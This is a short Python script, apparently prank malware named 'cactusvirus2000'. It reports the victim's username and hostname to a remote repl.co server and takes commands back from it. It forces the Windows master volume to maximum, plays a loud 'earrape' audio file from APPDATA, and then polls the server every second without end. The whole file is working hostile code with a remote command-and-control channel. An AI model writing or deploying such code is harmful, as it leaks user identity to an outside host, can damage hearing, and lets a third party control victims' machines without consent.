import os
import time
import json
import socket
import getpass
import requests
import winsound
from comtypes import CLSCTX_ALL
from ctypes import cast, POINTER
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

username = getpass.getuser() + "@" + socket.gethostname()
options = json.loads(requests.get("https://cactusvirus2000.quentinaniere.repl.co/API/login/" + username).text)

if options["isStartingEarrapeActive"] == "true":

    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevel(-0.0, None) #Put the max volume

    time.sleep(float(options["delayBeforePlaying"]))
    winsound.PlaySound(os.getenv("APPDATA") + r"\assets\nopal_earrape.wav", winsound.SND_ASYNC)

    time.sleep(float(options["playingtime"]))
    winsound.PlaySound(None, 0)

while True:
    options = json.loads(requests.get("https://cactusvirus2000.quentinaniere.repl.co/API/fetch/getUserOptions/" + username + "/true").text)
    time.sleep(1)
